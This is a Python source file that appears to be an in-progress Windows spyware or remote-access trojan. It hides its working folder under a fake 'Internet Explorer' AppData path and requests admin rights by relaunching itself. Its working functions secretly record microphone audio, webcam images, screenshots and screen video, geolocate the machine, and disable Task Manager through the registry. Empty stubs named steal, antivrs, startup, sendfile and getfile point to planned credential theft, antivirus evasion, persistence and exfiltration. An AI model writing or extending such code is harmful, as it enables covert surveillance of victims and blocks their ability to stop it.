import os, sys
from PIL import ImageGrab
import screeninfo
import mss
import cv2
import time
from threading import Thread
import numpy as np
import threading
import pyaudio, wave
import subprocess
import requests
from urllib.request import urlopen
import re
import win32com.shell.shell as shell
import ctypes


Thisfile = sys.argv[0]  # Full file path with name and file format
Thisfile_name = os.path.basename(Thisfile)  # File name without path
user_path = os.path.expanduser('~')  # Path to user folder
ultiDevPath = f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Internet Explorer"   # Change folder name if needed
folders = ['Startup', 'Data', 'RemoteDesktop', 'bat']

os.makedirs(ultiDevPath, exist_ok=True)

for folder in folders:
    folder_path = os.path.join(ultiDevPath, folder)
    globals()[f"{folder}Path"] = folder_path  # Adds a variable for every folder by adding "Path" to folder name, e.g. "RemoteDesktopPath" or "batPath"


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
def ping(parameter):
    global ip
    """
    Pings an IP address and prints the result.

    Args:
        ip_address (str): The IP address to ping.
        count (int): The number of ping requests to send (default is 4).
    """

    autoLocate = True

    ip = parameter  # Replace with the IP address you want to ping

    param = '-n' if subprocess.os.name == 'nt' else '-c'
    try:
        # Run the ping command
        result = subprocess.run(
            ['ping', param, str(4), ip],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        print(result.stdout if result.returncode == 0 else result.stderr)
    except Exception as e:
        print(f"An error occurred: {e}")
def locate(parameter):
    def iplct():
        d = str(urlopen('http://checkip.dyndns.com/').read())
        return re.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(d).group(1)
    iplc = iplct()
    try:
        response = requests.get(url=f'http://ip-api.com/json/{iplc}').json()

    # Print results
        print(" ")
        print("Locating Device...")
        print(" ")
        print("-" * 65)
        print(f"IP: {response.get('query')}, Provider: {response.get('isp')}, Org: {response.get('org')}")
        print("-" * 65)
        print(f"Country: {response.get('country')}, Region: {response.get('regionName')}, City: {response.get('city')}")
        print("-" * 65)
        print(f"ZIP: {response.get('zip')}, Latitude: {response.get('lat')}, Longitude: {response.get('lon')}")
        print("-" * 65)

        # Use a public IP service
        response = requests.get("https://api64.ipify.org?format=json")  # Supports both IPv4 and IPv6
        response.raise_for_status()
        public_ip = response.json().get("ip")
        print(f"Public IP: {public_ip}")
        print("-" * 65)

    except requests.exceptions.ConnectionError:
        print("Couldn't connect to server, try again later")
def taskmgr(parameter):
    if parameter == "opn":
        try:
            subprocess.Popen("taskmgr")
            print("Task Manager opened.")
        except Exception as e:
            print(f"Error opening Task Manager: {e}")
    if parameter == "cls":
        try:
            os.system("taskkill /IM taskmgr.exe /F")
            print("Task Manager closed.")
        except Exception as e:
            print(f"Error closing Task Manager: {e}")
    if parameter == "on":
        try:
            command = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 0 /f'
            shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c ' + command)
            print("Successfully enabled Task Manager")
        except Exception as e:
            print(f"Something went wrong: {e}")
    if parameter == "off":
        try:
            command = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f'
            shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c ' + command)
            print("Successfully disabled Task Manager")
            try:
                os.system("taskkill /IM taskmgr.exe /F")
                print("Task Manager closed.")
            except Exception as e:
                print(f"Error closing Task Manager: {e}")
        except Exception as e:
            print(f"Something went wrong: {e}")
    if not parameter == "opn" or "cls" or "on" or "off":
        print("Wrong parameter...")
def uac(parameter):
    pass
def regedit(parameter):
    pass
def explorer(parameter):
    pass
def conpan(parameter):
    pass
def blockurl(parameter):
    pass
def unblockurl(parameter):
    pass
def opensite(parameter):
    pass
def blockprcss(parameter):
    pass
def video(parameter):
    pass
def audio(duration):
    """
        Record audio for a specific duration and save it as a .wav file.

        Args:
            duration (int): Duration of the recording in seconds.
            filename (str): Optional custom filename for the output file.
        """
    # Audio settings
    chunk = 1024
    format = pyaudio.paInt16
    channels = 1
    rate = 44100

    audio = pyaudio.PyAudio()

    print("Recording started...")
    stream = audio.open(format=format, channels=channels,
                        rate=rate, input=True,
                        frames_per_buffer=chunk)
    frames = []
    for _ in range(0, int(rate / chunk * duration)):
        data = stream.read(chunk)
        frames.append(data)

    print("Recording finished.")

    stream.stop_stream()
    stream.close()
    audio.terminate()

    timestamp = time.strftime("%Y%m%d_%H%M%S")
    filename = f"audio_capture_{timestamp}.wav"

    output_path = os.path.join(DataPath, filename)

    with wave.open(output_path, 'wb') as wf:
        wf.setnchannels(channels)
        wf.setsampwidth(audio.get_sample_size(format))
        wf.setframerate(rate)
        wf.writeframes(b''.join(frames))

    print(f"Audio saved to {output_path}")
def wbcmimg(parameter):
    """
        Capture a single image from the webcam and save it to the DataPath.
        """
    cap = cv2.VideoCapture(0)
    cap.set(cv2.CAP_PROP_BACKLIGHT, 0)
    for i in range(30):
        cap.read()
    ret, frame = cap.read()
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    cv2.imwrite(DataPath + f'\\webcam_capture_{timestamp}.jpg', frame)
    cap.release()
def scrnsht(parameter):
    with mss.mss() as sct:
        monitors = sct.monitors
        monitor_count = len(monitors) - 1

        print(f"Detected {monitor_count} monitor(s).")

        for index, monitor in enumerate(monitors[1:], start=1):  # Skip monitor[0]

            screenshot = sct.grab(monitor)

            screenshot_path = os.path.join(DataPath, f'screenshot_monitor_{index}.png')
            mss.tools.to_png(screenshot.rgb, screenshot.size, output=screenshot_path)
            print(f"Screenshot saved for Monitor {index}: {screenshot_path}")

    try:
        for index in range(monitor_count):
            pass
            #os.remove(os.path.join(DataPath, f'screenshot_monitor_{index + 1}.jpg'))
    except Exception as e:
        print(f"Error during cleanup: {e}")


def scrnrcd(duration):
    def record_monitor(monitor, monitor_index, duration):
        """
        Record video for a specific monitor and adjust the FPS for playback.

        Args:
            monitor (dict): Monitor dimensions from mss.
            monitor_index (int): Index of the monitor being recorded.
            duration (int): Duration of the recording in seconds.
        """
        video_path = os.path.join(DataPath, f"monitor_{monitor_index}.mp4")
        print(f"Recording Monitor {monitor_index} to {video_path}")

        # Define video codec for output file
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')  # Use 'mp4v' codec for .mp4 files
        width, height = monitor["width"], monitor["height"]

        frame_times = []
        frames = []
        with mss.mss() as sct:
            for _ in range(duration * 20):
                start_time = time.time()

                screenshot = sct.grab(monitor)

                frame = np.array(screenshot)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)

                frames.append(frame)
                frame_times.append(time.time() - start_time)

                elapsed_time = time.time() - start_time
                sleep_time = max(0, (1 / 20) - elapsed_time)
                time.sleep(sleep_time)

        actual_fps = 1 / (sum(frame_times) / len(frame_times))
        print(f"Finished recording Monitor {monitor_index}: {video_path} (Actual FPS: {actual_fps:.2f})")

        out = cv2.VideoWriter(video_path, fourcc, actual_fps, (width, height))

        for frame in frames:
            out.write(frame)

        out.release()
        print(f"Video saved to {video_path}")

    with mss.mss() as sct:
        monitors = sct.monitors[1:]

        print(f"Detected {len(monitors)} monitor(s). Starting recording...")

        threads = []
        for index, monitor in enumerate(monitors, start=1):
            thread = Thread(target=record_monitor, args=(monitor, index, duration))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

    print("All recordings finished.")


def antivrs(parameter):
    pass
def pcinfo(parameter):
    pass
def steal(parameter):
    pass
def onchat(parameter):
    pass
def remoteplay(parameter):
    pass
def dir(parameter):
    pass
def updatecode(parameter):
    pass
def startup(parameter):
    pass
def sendfile(parameter):
    pass
def getfile(parameter):
    pass
def help(parameter):
    pass


if __name__ == "__main__":
    if not is_admin():
        # Relaunch the script with admin rights
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, __file__, None, 1
        )
    else:
        print("Running as administrator!")
        # Your script logic here
        taskmgr("on")